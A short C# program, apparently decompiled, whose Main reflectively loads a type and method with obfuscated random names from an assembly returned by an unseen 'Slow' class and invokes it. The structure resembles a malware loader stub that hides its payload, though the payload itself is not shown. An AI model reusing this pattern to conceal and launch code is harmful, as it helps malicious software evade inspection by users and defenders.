using System;
using System.Reflection;

namespace WindowsFormsApp59;

internal class Program
{
	private static void Main()
	{
		new Slow();
		GetAction()();
	}

	private static Action GetAction()
	{
		return (Action)Delegate.CreateDelegate(typeof(Action), Drive() as MethodInfo);
	}

	private static object Drive()
	{
		return new Slow().MyAssembly().GetType("Ghzdza.Zalbjxdulpc")!.GetMethod("Euzkqoxwoj");
	}
}
